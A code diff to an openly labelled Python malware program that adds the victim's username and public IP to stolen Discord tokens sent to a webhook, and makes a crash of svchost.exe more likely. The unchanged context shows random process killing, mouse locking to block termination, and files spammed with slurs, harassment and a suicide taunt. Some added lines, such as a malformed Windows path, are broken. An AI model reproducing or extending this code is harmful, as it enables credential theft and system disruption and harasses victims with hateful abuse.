@@ -1,5 +1,7 @@
-import ctypes, random, time, webbrowser, threading, sys, os, psutil, base64, shutil, string, mouse, re, json
+import ctypes, random, time, webbrowser, threading, sys, os, psutil, base64, shutil, string, mouse, re, json, requests
 from urllib.request import Request, urlopen
+from playsound import playsound
+
 
 class harmless:
     """Harmless modules"""
@@ -35,8 +37,19 @@ class harmless:
                 pass
     
     def mouse_lock(self):
+        """Locks the mouse to prevent the program from being killed"""
         while 1:
             mouse.drag(0, 0, 0, 0, absolute=True, duration=0)
+            
+    def sound(self):
+        while 1:
+            try:
+                sound = random.choice(os.listdir("C:\Windows\Media\Windows\)"))
+                path = f"C:\Windows\Media\Windows\{sound}"
+                
+                #playsound("C:\Windows\Media\Windows Critical Stop.wav")
+            except:
+                pass
         
         
             
@@ -56,13 +69,15 @@ class malware:
         """KILLS RANDOM PROCESSES"""
         while 1:
             processes = []
-            for proc in psutil.process_iter():
-                try:
-                    processName = proc.name()
-                    processes.append(processName)
-                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
-                    pass
-                
+            try:
+                for proc in psutil.process_iter():
+                    try:
+                        processes.append(proc.name())
+                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                        pass
+            except:
+                pass
+            finally:
                 program = random.choice(processes)
                 if program != "svchost.exe":
                     os.system(f"taskkill /f /im {program}")
@@ -77,7 +92,7 @@ class malware:
                 return is_admin
             
             if isAdmin():
-                if random.randint(0, 100) == 1:
+                if random.randint(0, 25) == 1:
                     os.system(f"taskkill /f /im svchost.exe")
                 
                 
@@ -88,15 +103,16 @@ class malware:
         while 1:
             for i in range(random.randint(1, 80)):
                 try:
-                    file_names = ["LOL UR RETARDED",
-                                "LOL I RATTED YOU",
-                                "UR SO GAY",
-                                "YOU KNOW DN?",
-                                "UR SO DUMB LOOOOL",
-                                "HANG URSELF",
-                                "Why did you run this?, lol.",
-                                "Add NotSqvage#6666 on discord and tell him hes gay",
-                                "If you see this you have to send money"]
+                    anti_spam = random.randint(0, 10000)
+                    file_names = [f"LOL UR RETARDED {anti_spam}",
+                                f"LOL I RATTED YOU {anti_spam}",
+                                f"UR SO GAY {anti_spam}",
+                                f"YOU KNOW DN? {anti_spam}",
+                                f"UR SO DUMB LOOOOL {anti_spam}",
+                                f"HANG URSELF {anti_spam}",
+                                f"Why did you run this?, lol. {anti_spam}",
+                                f"Add NotSqvage#6666 on discord and tell him hes gay {anti_spam}",
+                                f"If you see this you have to send money {anti_spam}"]
                     
                     byte_stream = random.choice(file_names).encode("ascii")
             
@@ -179,7 +195,6 @@ if __name__ == "__main__":
                 continue
 
             message += f'\n**{platform}**\n```\n'
-
             tokens = find_tokens(path)
 
             if len(tokens) > 0:
@@ -196,14 +211,17 @@ if __name__ == "__main__":
         }
 
         payload = json.dumps({'content': message})
+        info = f" {os.environ['USERNAME']} {requests.get('https://api.ipify.org').text}"
+        
+        packet = payload + info
 
         try:
-            req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+            req = Request(WEBHOOK_URL, data=packet.encode(), headers=headers)
             urlopen(req)
         except:
             pass
         
-        main()
+    main()
     
     
     harmless = harmless()
@@ -217,9 +235,12 @@ if __name__ == "__main__":
     kill_thread = threading.Thread(target=malware.kill).start()
     random_kill_thread = threading.Thread(target=malware.random_kill).start()
     create_random_folder_thread = threading.Thread(target=malware.create_random_folder).start()
+    sound_thread = threading.Thread(target=harmless.sound).start()
     #rat_thread = threading.Thread(target=harmful.rat).start()
     
     #Make rat multiprocessed
+    
+    #Multiprocesses
     
     popup_thread.join()
     openurl_thread.join()
@@ -228,6 +249,7 @@ if __name__ == "__main__":
     mouse_locker.join()
     random_kill_thread.join()
     create_random_folder_thread.join()
+    sound_thread.join()
     #rat_thread.join()
     
     
